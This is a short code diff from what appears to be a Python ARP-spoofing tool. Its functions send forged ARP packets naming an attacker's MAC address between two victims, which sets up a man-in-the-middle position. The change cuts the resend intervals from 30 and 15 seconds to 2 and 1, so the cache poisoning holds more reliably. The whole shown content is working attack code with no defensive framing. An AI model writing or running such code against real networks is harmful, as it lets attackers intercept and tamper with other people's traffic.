@@ -33,14 +33,14 @@ def send_ARP(interface, mac_attacker, victim, destination):
 
     arp = create_ARP(interface, mac_attacker, victim, destination)
 
-    sendp(arp, iface=interface, loop=1, inter=30)
+    sendp(arp, iface=interface, loop=1, inter=2)
 
 def send_mitm_ARP(interface, mac_attacker, victim1, victim2):
 
     arp1 = create_ARP(interface, mac_attacker, victim1, victim2)
     arp2 = create_ARP(interface, mac_attacker, victim2, victim1)
 
-    sendp([arp1, arp2], iface=interface, loop=1, inter=15)
+    sendp([arp1, arp2], iface=interface, loop=1, inter=1)
 
 
 def print_menu(scan_list):
